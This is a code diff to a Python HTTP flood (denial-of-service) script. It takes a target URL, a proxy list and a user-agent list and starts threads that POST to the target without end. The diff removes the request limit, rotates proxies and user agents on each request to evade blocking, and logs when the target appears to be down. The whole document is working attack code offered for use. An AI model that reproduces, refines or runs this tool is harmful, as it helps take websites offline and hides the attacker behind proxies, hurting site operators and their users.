@@ -28,12 +28,11 @@ proxy_file_loc = input("Enter the location of the proxy list: ")
 header_agent_file_loc = input("Enter the location of the user agent list: ")
 target_url = input("Enter the target url: ")
 threading_num = input("Enter the threading number: ")
-iteration_num = input("Enter the iteration number: ")
 
 PROXIE_FILE_LOC = proxy_file_loc
 TARGET_URL = target_url
 THREADING_NUM = int(threading_num)
-ITERATION_NUM = int(iteration_num)
+
 
 file = " "
 
@@ -44,9 +43,6 @@ except FileNotFoundError:
     exit(-1)
 
 word: str = " "
-d = 0
-
-
 
 for f in file.read():
     if f == '\n':
@@ -54,10 +50,6 @@ for f in file.read():
         word = ""
     else:
         word = word + f
-
-
-for x in p_:
-    print(x)
 
 word = " "
 
@@ -80,40 +72,30 @@ s.proxies = p_[random.randint(0, len(p_)-1)]
 s.trust_env = False
 s.headers = ua[0]
 
-for x in ua:
-    print(x)
-
-
+print(f"[LOG]: Attacking {TARGET_URL} with {len(p_)} Proxie(s) and {len(ua)} User-Agent(s) on {threading_num} Threads")
 
 class AttackThread(threading.Thread):
-    def __init__(self, session: requests.Session, c: int):
+    def __init__(self, session):
         super(AttackThread, self).__init__()
         self.session = session
-        self.total = 0
-        self.count = c
 
     def run(self):
         try:
-            count = 0
-            d = 0
-            for i in range(self.count):
-                try:
+            while True:
                     rsp = self.session.post(TARGET_URL)
-                    count += 1
                     self.session.proxies = p_[random.randint(0, len(p_) - 1)]
                     self.session.headers = ua[random.randint(0, len(ua) - 1)]
-                    print("\n")
-                    print(f"Count: [{count}], rsp:{rsp}, Loc: {p_[d]}")
-                except: pass
-
-
+                    print(f"[LOG]: Attacking:[{TARGET_URL}], Response:[{rsp}]\n")
         except urllib3.connection.NewConnectionError:
             print(f"[LOG]: {TARGET_URL} is not responding.. it is probably down\n")
         except urllib3.connection.HTTPConnection:
             print(f"[LOG]: {TARGET_URL} is not responding.. it is probably down\n")
+        except urllib3.exceptions.MaxRetryError:
+            print(f"[LOG]: {TARGET_URL} is not responding.. it is probably down\n")
 
 
-threads = [AttackThread(s, ITERATION_NUM) for _ in range(THREADING_NUM)]
+
+threads = [AttackThread(s) for _ in range(THREADING_NUM)]
 
 for thread in threads:
     thread.start()
